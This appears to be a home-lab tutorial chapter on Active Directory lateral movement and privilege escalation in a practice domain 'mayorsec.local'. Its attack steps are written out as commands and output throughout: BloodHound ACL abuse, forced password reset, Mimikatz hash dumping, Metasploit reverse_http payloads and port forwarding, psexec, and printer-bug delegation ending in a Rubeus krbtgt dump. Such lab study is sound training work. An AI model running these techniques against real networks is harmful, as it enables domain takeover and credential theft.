# 4. Movement, Pivoting, and Persistence in Domain

> ### Machines Required: WorkStation-01,02 and Domain Controller

## 1. Domain Through BloodHound

- Interact with the session of user s.chisholm, Change the directory to `C:\Users\Public`and upload `sharphound.exe` on the target machine.

- Execute the sharphound by using cmd `shell sharphound.exe -c all`.

```powershell
(singhx) > shell sharphound1.exe -c all

76 name to SID mappings.
 1 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.

```
- Download the `zip` file using Covenant's download command.

```powershell
(singhx) > download 20230727141452_BloodHound.zip

Download completed: 20230727141452_BloodHound.zip
```
- Start `neo4j console` and log in.
- Open BloodHound and upload the zip file we downloaded.
- On navigating to the Analysis tab and finding the shortest path to domain admins we get a graph showing the path to domain admins.

## 2. Abusing ACLs

- Download [PowerView_dev.ps1](https://github.com/lucky-luk3/ActiveDirectory/blob/master/PowerView-Dev.ps1) and upload to the target machine using Covenant's Upload method.

![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/42592b10-2287-4788-bb00-92640b397eac)

- Here we have an escalation path from user s.chisholm to domain admins.

![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/53c1f8b1-8045-46e2-aca1-9a28f825850b)

- Move to the PowerShell console, change the directory to `C:\Useers\Public` and invoke `powerview_dev.ps1` in the console.
- use cmd `net user s.chisholm /domain` to get details about the user. The user is a member of Sales, Domain users.

```powershell
PS C:\Users\s.chisholm.mayorsec> cd c:\users\public
PS C:\users\public> . .\powerview_dev.ps1
PS C:\users\public> net user s.chisholm /domain
The request will be processed at a domain controller for domain mayorsec.local.
User name                    s.chisholm

---------------------------------SNIP-----------------------------------------

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Sales
The command completed successfully.
```

- As we have `GenericAll` permission for the user we can add the user to the group.
- Let's add "s.chisholm" to the group "Engineering".

```powershell
PS C:\users\public> net group engineering s.chisholm /add /domain
The request will be processed at a domain controller for domain mayorsec.local.

The command completed successfully.
```
- Actively observing at Bloodhoundd graph we also have `GenericAll` permissions to the "IT ADMINS" group.

```powershell
PS C:\users\public> net group "IT ADMINS" s.chisholm /add /domain
The request will be processed at a domain controller for domain mayorsec.local.

The command completed successfully.
```
- Now, we will reset the password for the user `j.taylor` by using the `-Force` method.

```powershell
PS C:\users\public> $SecPassword = ConvertTo-SecureString "FallOutBoy1!" -AsPlainText -Force
PS C:\users\public> $SecPassword = ConvertTo-SecureString 'FallOutBoy1!' -AsPlainText -Force
PS C:\users\public> $cred = New-Object System.Management.Automation.PSCredential('mayorsec\s.chisholm', $SecPassword)
PS C:\users\public> $UserPass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\users\public> Set-DomainUserPassword -Identity j.taylor -AccountPassword $UserPass -Credential $cred
```
- On looking for information on user "j.taylor" we get to know that it's in the administrators group.

```powershell
PS C:\users\public>  net user j.taylor /domain
The request will be processed at a domain controller for domain mayorsec.local.

User name                    j.taylor

------------------SNIP-----------------------

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users         *IT Admins
The command completed successfully.
```

- Now, we can log in to `PS Session` using "j.taylor's" credentials.

```powershell
PS C:\users\public> Enter-PSSession -ComputerName dc01 -Credential mayorsec\j.taylor
[dc01]: PS C:\Users\j.taylor\Documents> whoami;hostname
mayorsec\j.taylor
DC01
```

- On observing at Bloodhound graph. User "j.taylor" has `WriteDACL` permissions to the "Administrators" group.

```powershell
[dc01]: PS C:\Users\j.taylor\Documents> net group "Domain Admins" j.taylor /add /domain

The command completed successfully.
```

- To verify our action we can use cmd `net user j.taylor` to see if the user is now a member of the Domain Admins group.

```powershell
[dc01]: PS C:\Users\j.taylor\Documents> net user j.taylor
User name                    j.taylor

------------------------SNIP------------------------

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Admins        *Domain Users
                             *IT Admins
```

## 3. Pivoting Through Remote Desktop via Compromised Host

- Come back to our Covenant session and run cmd `Mimikatz token::elevate lsadump::sam`.
- In return, we will get a hash for user "j.taylor"

![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/2d8f6a04-9538-4a05-a5ac-5804dc8d2917)

- Next, we will crack the hashes using the method we used before.
- Now, we have the credentials so we can Remote Desktop Connection to "WorkStatin-02" from "WorkStation-01"

![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/d58bbe53-8dc3-4e6d-8878-9a41d50f8701)

- After entering the credentials, we will successfully get Remote Desktop Connection to "WorkStation-02".

- By using the remote desktop connection on WorkStation-02, we can pivot from here to the Domain Controller by using the same method.

## 4. Configuring Reverse Port Forwarding / Gaining shell on Internal WorkStation

- For this, we will pass the session to the Metasploit, and from there we will do reverse port forwarding to the Covenant.
- In order to get session on Metasploit, run `msfconsole`.

```bash
> use exploit/multi/script/web_delivery
> set payload windows/x64/meterpreter/reverse_http
> set lport 7776
> set lhost wlan0
> exploit -j
```
- Copy the generated Powershell command and navigate to the Covenant and type `PowerShell` followed by the Metasploit command and run it.
- We will get a shell to our Metasploit session.

```bash
> sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: mayorsec\s.chisholm
```
- Run `ipconfig` cmd and see the available hosts.

```powershell
meterpreter > ipconfig

Interface 16
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
Hardware MAC : 08:00:27:67:94:3a
MTU          : 1500
IPv4 Address : 192.168.16.9
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::33a1:10cf:cc2e:6048
IPv6 Netmask : ffff:ffff:ffff:ffff::
```
- Run `autoroute` cmd.

```powershell
meterpreter > run autoroute -s 192.168.16.0/24
meterpreter > run autoroute -p

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.16.0       255.255.255.0      Session 2
```

- Let's do port forward from our local machine.

```powershell
meterpreter > portfwd add -R -p 6767 -l 444 -L xxx.xxx.xxx.xxx
meterpreter > portfwd 

Active Port Forwards
====================

   Index  Local                Remote     Direction
   -----  -----                ------     ---------
   1      xxx.xxx.xxx.xxx:444  [::]:6767  Reverse
```
- Background the session and search for `socks`

```powershell
> use auxiliary/server/socks_proxy
> set srvport 9050
 > exploit -j
```
- Move to Covenant, and generate a new listener.
- Make sure to enter the Connect Address to the address of the internal machine.

- As we have the credentials of user "j.taylor" we will utilize Metasploit's `psexec` module.

```bash
> use exploit/windows/smb/psexec 
> set rhost 192.168.16.9
> set rport 445
> set smbdomain mayorsec
> set smbuser j.taylor
> set smbpass Password123!
> set payload windows/x64/exec
> set cmd <Covenant powershell cmd> 
> exploit
```

- On running the exploit we successfully get a Grunt on covenant.

## 5. Remoting Through ProxyChains (Using Covenant)

- One simple method of gaining a reverse shell is by using Covenant's `PowerShellRemotingCommand`.

```powershell
> PowerShellRemotingCommand workstation-02 "<Powershell Launcher Command>" mayorsec j.taylor Password123!
```
![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/950ecf8d-e735-43f5-be4b-a0536bbbc02f)

- To access Remote Desktops through proxy chains. Make sure that the meterpreter session is active with port forward.
- Run cmd in the new terminal as:

```bash
└─$ proxychains xfreerdp /u:j.taylor /p:'Password123!' /v:192.168.16.9 /d:mayorsec
```

## 6. Unconstrained Delegation

> **Use covenant session for "j.taylor"**

- First, we need to upload [ms-rprn.exe](https://raw.githubusercontent.com/0x00ach/stuff/master/MS-RPRN.exe) to the target system.

![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/2eba3330-8ce8-44a2-b567-1b0758f120ce)

- On running the program we get its usage.

```powershell
(singhx) > shell ms-rprn.exe

Usage: ms-rprn.exe \\targetserver \\CaptureServer
```

- Let's run a command to set the hostname of the domain.

```powershell


[07/27/2023 21:39:38 UTC] PowerShell completed

(singhx) > PowerShell Get-NetComputer -Unconstrained -Properties dnshostname

dnshostname        
-----------        
DC01.mayorsec.local
```
- Now, we will run the binary in cmd with the necessary arguments.

```powershell
> shell ms-rprn.exe \\dc01 \\workstation-02
```
- Let's dump `kbtgt` using Rubeus.

```powershell
> Rubeus dump /service:krbtgt
